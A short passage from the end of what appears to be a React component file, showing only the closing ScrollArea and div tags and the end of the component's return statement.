        </ScrollArea>
      </div>
    </div>
  );
}
